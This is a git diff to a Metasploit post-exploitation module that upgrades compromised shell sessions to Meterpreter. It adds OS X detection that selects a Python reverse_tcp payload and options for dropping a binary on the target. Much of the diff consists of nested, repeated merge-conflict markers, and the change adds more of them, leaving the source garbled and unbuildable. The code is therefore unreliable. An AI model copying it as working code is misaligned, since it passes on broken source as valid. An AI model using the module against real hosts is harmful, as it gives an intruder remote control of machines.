@@ -47,6 +47,7 @@ class Metasploit3 < Msf::Post
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -57,11 +58,14 @@ class Metasploit3 < Msf::Post
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
+=======
+>>>>>>> master
         [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),
       OptString.new('BOURNE_PATH',
         [false, 'Remote path to drop binary']),
       OptString.new('BOURNE_FILE',
         [false, 'Remote filename to use for dropped binary'])
+<<<<<<< HEAD
 =======
         [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil])
 >>>>>>> 4.11.2_release_pre-rails4
@@ -104,6 +108,8 @@ class Metasploit3 < Msf::Post
 =======
         [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil])
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> master
     ], self.class)
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
@@ -151,7 +157,7 @@ class Metasploit3 < Msf::Post
       vprint_status("Platform: Solaris")
     else
       # Find the best fit, be specific with uname to avoid matching hostname or something else
-      target_info = cmd_exec('uname -mo')
+      target_info = cmd_exec('uname -ms')
       if target_info =~ /linux/i && target_info =~ /86/
         # Handle linux shells that were identified as 'unix'
         platform = 'linux'
@@ -159,7 +165,11 @@ class Metasploit3 < Msf::Post
         lplat = [Msf::Platform::Linux]
         larch = [ARCH_X86]
         vprint_status("Platform: Linux")
-      elsif cmd_exec('python -V') =~ /Python (2|3)\.(\d)/
+      elsif target_info =~ /darwin/i
+        platform = 'python'
+        payload_name = 'python/meterpreter/reverse_tcp'
+        vprint_status("Platform: OS X")
+      elsif cmd_exec('python -V 2>&1') =~ /Python (2|3)\.(\d)/
         # Generic fallback for OSX, Solaris, Linux/ARM
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
@@ -170,7 +180,7 @@ class Metasploit3 < Msf::Post
     vprint_status("Upgrade payload: #{payload_name}")
 
     if platform.blank?
-      print_error("Shells on the the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
+      print_error("Shells on the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
       return nil
     end
 
